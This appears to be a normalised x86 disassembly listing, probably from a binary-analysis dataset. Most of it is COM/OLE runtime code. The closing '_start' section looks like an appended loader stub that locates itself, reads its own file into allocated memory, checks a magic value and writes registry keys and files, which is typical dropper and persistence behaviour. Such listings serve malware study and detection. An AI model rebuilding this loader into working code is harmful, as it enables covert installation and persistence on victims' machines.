mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ rw-data ]
mov [ esi + 0x14 ] eax
mov eax [ rw-data ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov di [ ebp + 0x10 ]
mov edx eax
add eax 0x60000
neg edx
sbb edx edx
mov [ ebp - 0x4 ] 0x3
and edx eax
cmp [ ebp + 0x8 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x10 ] edx
mov [ esi + 0x8 ] di
je r-xdata
neg di
mov ecx [ ebp - 0xc ]
mov eax esi
sbb edi edi
and edi 0x7fff0001
add edi 0x8000ffff
mov [ esi + 0x1c ] edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push [ ebp + 0x8 ]
call sub_422601
sub_429746
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
cmp [ esi + 0x4 ] 0x0
je r-xdata
and [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_429760
mov eax sub_42b439
call sub_410a78
sub esp 0x60
push ebx
mov ebx ecx
push esi
push edi
cmp [ ebx ] 0x0
mov [ ebp - 0x28 ] ebx
je r-xdata
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x78 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x18
push 0x10
lea eax [ ebp - 0x4c ]
push 0x0
push eax
call sub_410a20
mov edi [ ebp + 0x18 ]
add esp 0xc
test edi edi
je r-xdata
mov eax [ ebp - 0x44 ]
push edi
call [ lstrlenA@IAT ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
test eax eax
je r-xdata
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x48 ] ecx
test [ ebp + 0xc ] 0xc
mov [ ebp - 0x1c ] 0xfffffffd
je r-xdata
lea eax [ ebp - 0x3c ]
xor esi esi
push eax
call sub_40ff70
cmp [ ebp + 0x10 ] si
je r-xdata
shl eax 0x4
push eax
call sub_4221b9
mov esi eax
mov eax [ ebp - 0x44 ]
shl eax 0x4
push eax
push 0x0
push esi
mov [ ebp - 0x4c ] esi
call sub_410a20
mov eax [ ebp - 0x44 ]
add esp 0x10
shl eax 0x4
cmp [ edi ] 0x0
mov [ ebp - 0x14 ] edi
lea esi [ eax + esi - 0x10 ]
mov [ ebp - 0x10 ] esi
je r-xdata
push 0x20
lea eax [ ebp - 0x6c ]
push 0x0
push eax
call sub_410a20
add esp 0xc
lea edx [ ebp - 0x2c ]
mov eax [ ebx ]
or [ ebp - 0x2c ] 0xffffffff
push edx
lea edx [ ebp - 0x6c ]
push edx
lea edx [ ebp - 0x4c ]
push esi
push edx
push [ ebp + 0xc ]
mov ecx [ eax ]
push 0x0
push r--data
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x18 ]
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x44 ]
test eax eax
je r-xdata
lea esi [ ebp - 0x3c ]
mov eax [ ebp + 0x1c ]
add esi 0x8
push 0x4
mov [ ebp - 0x18 ] esi
lea ebx [ eax - 0x4 ]
add eax 0xfffffff8
mov [ ebp + 0x1c ] eax
pop edi
push [ ebp - 0x4c ]
call sub_4221e2
xor ebx ebx
pop ecx
cmp [ ebp + 0x18 ] ebx
jge r-xdata
mov ecx [ ebp - 0x4c ]
mov esi edi
shl eax 0x4
cmp [ edi ] 0x0
lea ebx [ eax + ecx - 0x10 ]
je r-xdata
movzx eax [ ecx ]
mov ecx 0x4002
cmp eax ecx
jg r-xdata
and ax 0xffbf
or ah 0x40
mov [ ecx ] ax
mov edi [ ebp + 0x10 ]
cmp di bx
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
call [ VariantClear@IAT ]
cmp [ ebp + 0x18 ] 0x80020009
je r-xdata
mov al [ esi ]
cmp al 0x8
je r-xdata
add eax 0xffffbffd
cmp eax 0xe
ja r-xdata
je r-xdata
cmp di 0xc
je r-xdata
cmp [ ebp - 0x54 ] ebx
je r-xdata
push [ ebp + 0x18 ]
call sub_42852f
push ebx
call [ VariantClear@IAT ]
cmp al 0xe
jne r-xdata
sub [ ebp - 0x10 ] 0x10
sub esi 0x10
inc [ ebp - 0x14 ]
mov [ ebp - 0x18 ] esi
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
jmp [ eax * 4 + jump_table_429c0b ]
add [ ebp + 0x1c ] edi
mov eax [ ebx + edi ]
add ebx edi
add eax 0xfffffffe
cmp eax 0xf
ja r-xdata
movzx eax di
add eax 0xfffffffe
cmp eax 0xf
ja r-xdata
push edi
lea eax [ ebp - 0x3c ]
push ebx
push eax
lea eax [ ebp - 0x3c ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
cmp esi ebx
jge r-xdata
push 0x20
call sub_4221b9
pop ecx
mov [ ebp + 0x14 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0x6c ]
push eax
call [ ebp - 0x54 ]
sub ebx 0x10
inc esi
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
movzx ax [ eax ]
test al 0x40
mov [ ecx ] ax
je r-xdata
mov ebx [ ebp - 0x28 ]
mov edi [ ebp + 0x18 ]
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
mov ecx [ eax ]
neg ecx
sbb ecx ecx
and ecx 0xffff
mov [ eax ] ecx
jmp r-xdata
jmp [ eax * 4 + jump_table_429bcb ]
jmp [ eax * 4 + jump_table_429c47 ]
lea eax [ ebp - 0x3c ]
push eax
call [ VariantClear@IAT ]
push esi
call sub_42852f
xor esi esi
push [ ebp - 0x6c ]
mov ecx eax
push ebx
push ebx
call sub_429670
mov esi eax
jmp r-xdata
mov [ esi ] eax
add [ ebp + 0x1c ] edi
mov al [ ebx + edi ]
add ebx edi
mov [ esi ] al
jmp r-xdata
add [ ebp + 0x1c ] edi
mov ax [ ebx + edi ]
add ebx edi
add [ ebp + 0x1c ] 0x8
add ebx 0x8
mov eax [ ebp + 0x1c ]
fld [ eax ]
fstp [ esi ]
jmp r-xdata
add [ ebp + 0x1c ] 0x8
add ebx 0x8
mov eax [ ebp + 0x1c ]
fld [ eax ]
fstp [ esi ]
jmp r-xdata
add [ ebp + 0x1c ] edi
mov eax [ ebx + edi ]
add ebx edi
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
push eax
mov [ ebp - 0x18 ] eax
call [ SysAllocString@IAT ]
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] eax
je r-xdata
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
neg eax
sbb eax eax
jmp r-xdata
add [ ebp + 0x1c ] 0x4
mov esi [ ebx + 0x4 ]
mov edi [ ebp - 0x10 ]
add ebx 0x4
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x18 ]
push 0x4
pop edi
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov cl [ ebp - 0x34 ]
mov [ eax ] cl
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov cx [ ebp - 0x34 ]
mov [ eax ] cx
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x34 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
push [ ebp - 0x34 ]
push [ ebp + 0x14 ]
call sub_4281db
push [ ebp - 0x34 ]
call [ SysFreeString@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp - 0x34 ] bx
setne al
mov [ ecx ] eax
jmp r-xdata
mov edi [ ebp + 0x14 ]
lea esi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x34 ]
mov [ eax ] ecx
cmp [ ebp - 0x64 ] ebx
je r-xdata
push [ ebp - 0x68 ]
lea ecx [ esi + 0x18 ]
call sub_422628
push [ ebp - 0x68 ]
call edi
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x68 ] ebx
mov edi [ SysFreeString@IAT ]
je r-xdata
test eax eax
jne r-xdata
push eax
call [ SysAllocString@IAT ]
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] eax
je r-xdata
push [ ebp - 0x18 ]
call [ lstrlenA@IAT ]
inc eax
mov [ ebp - 0x20 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_411530
mov eax esp
push [ ebp - 0x20 ]
xor ecx ecx
mov [ ebp - 0x24 ] eax
push eax
push 0xffffffff
push [ ebp - 0x18 ]
mov [ eax ] cx
push ecx
push ecx
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0x24 ]
mov [ esi ] ax
jmp r-xdata
cmp [ ebp - 0x60 ] ebx
je r-xdata
push [ ebp - 0x64 ]
lea ecx [ esi + 0xc ]
call sub_422628
push [ ebp - 0x64 ]
call edi
call sub_41dc26
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x8
jmp r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x5c ]
push r--data
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x50 ]
mov [ esi + 0x1c ] eax
lea eax [ ebp + 0x14 ]
push eax
mov [ ebp + 0x14 ] esi
call sub_410a97
push [ ebp - 0x60 ]
lea ecx [ esi + 0x14 ]
call sub_422628
push [ ebp - 0x60 ]
call edi
call sub_41dc26
sub_429c98
mov eax sub_42abd8
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x4
push ecx
call sub_424fe7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_429ce8
mov eax sub_42ac50
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x28 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
call sub_42731d
cmp [ eax + 0x4 ] esi
jne r-xdata
push eax
call [ CloseHandle@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_421d03
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
and [ eax + 0x4 ] 0x0
sub_429d41
mov eax sub_42b55c
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_429d79
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_421d03
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_429d92
push esi
mov esi ecx
cmp [ esi + 0x42 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
and [ esi + 0x42 ] 0x0
push eax
call [ CoRevokeClassObject@IAT ]
and [ esi + 0x20 ] 0x0
sub_429db3
push esi
call sub_4272f7
push 0x0
mov esi eax
call sub_427d7a
mov esi [ esi + 0x24 ]
push 0x0
call sub_427dea
pop esi
retn
mov ecx esi
call sub_429d92
mov esi [ esi + 0x1c ]
jmp r-xdata
test esi esi
je r-xdata
sub_429dde
push ebx
push ebp
push esi
push edi
call sub_4272f7
push 0x1
mov ebp eax
call sub_427d7a
add ebp 0x34
xor ebx ebx
mov esi ebp
push 0x1
mov [ ebp ] bl
call sub_427dea
call sub_4272f7
mov eax [ eax + 0x4 ]
cmp eax ebx
je r-xdata
push 0xa
push esi
call sub_411342
pop ecx
mov edi eax
pop ecx
mov [ edi ] bl
call sub_4272f7
push [ eax + 0x8 ]
push esi
call [ UnregisterClassA@IAT ]
lea esi [ edi + 0x1 ]
jmp r-xdata
call sub_4270c5
mov esi eax
mov ecx [ esi + 0xcc ]
lea edi [ esi + 0xcc ]
cmp ecx ebx
je r-xdata
mov eax [ eax + 0x54 ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
call sub_4272f7
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xb8 ]
test eax eax
je r-xdata
push ebx
push 0x1
call eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
cmp eax ebx
je r-xdata
mov [ edi ] ebx
mov eax [ esi + 0x2c ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0x30 ] ebx
push eax
call edi
mov [ esi + 0x2c ] ebx
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_72a27d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_72afe0
add esp 0x4
call sub_72b110
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_72b140
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_72b140
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x39
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov edx [ ebp - 0x294 ]
push edx
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x23
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3b
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x37
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_72afe0
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_72afe0
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_72afe0
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_72afe0
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_72afe0
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
mov [ ebp - 0x288 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_72afe0
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x288 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x288 ] edx
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
